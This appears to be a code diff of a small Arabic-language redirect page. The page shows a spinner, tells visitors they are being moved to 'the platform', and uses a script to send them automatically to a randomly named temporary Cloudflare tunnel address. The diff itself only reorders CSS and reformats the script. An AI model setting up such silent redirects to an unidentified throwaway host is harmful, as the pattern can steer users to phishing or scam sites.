@@ -13,14 +13,13 @@
          background: radial-gradient(1200px 600px at 80% -10%, #0c6084 0%, #0c3054 45%, #071b2b 100%); color:#eaf2f8; }
   .card { text-align:center; padding:40px 34px; border-radius:22px; background:rgba(255,255,255,.07);
           border:1px solid rgba(255,255,255,.14); backdrop-filter:blur(12px); max-width:420px; }
-  .logo { width:64px; height:64px; border-radius:16px; background:#fff; display:grid; place-items:center; margin:0 auto 16px; }
+  .spin { width:26px; height:26px; margin:0 auto 14px; border:3px solid rgba(255,255,255,.25);
+          border-top-color:#fff; border-radius:50%; animation:s .8s linear infinite; }
+  @keyframes s { to { transform:rotate(360deg); } }
   h1 { font-size:19px; margin:0 0 6px; }
   p { margin:0 0 18px; font-size:13px; opacity:.8; line-height:1.7; }
   a { display:inline-block; padding:11px 22px; border-radius:11px; background:#1b84b8; color:#fff;
       text-decoration:none; font-weight:700; font-size:13.5px; }
-  .spin { width:26px; height:26px; margin:0 auto 14px; border:3px solid rgba(255,255,255,.25);
-          border-top-color:#fff; border-radius:50%; animation:s .8s linear infinite; }
-  @keyframes s { to { transform:rotate(360deg); } }
 </style>
 </head>
 <body>
@@ -30,8 +29,6 @@
     <p>جارٍ تحويلك إلى المنصة…<br/>إن لم يحدث تلقائياً اضغط الزر أدناه.</p>
     <a href="https://casinos-webshots-meet-narrow.trycloudflare.com">فتح المنصة</a>
   </div>
-  <script>
-    try { location.replace("https://casinos-webshots-meet-narrow.trycloudflare.com"); } catch (e) {}
-  </script>
+  <script>try { location.replace("https://casinos-webshots-meet-narrow.trycloudflare.com"); } catch (e) {}</script>
 </body>
 </html>
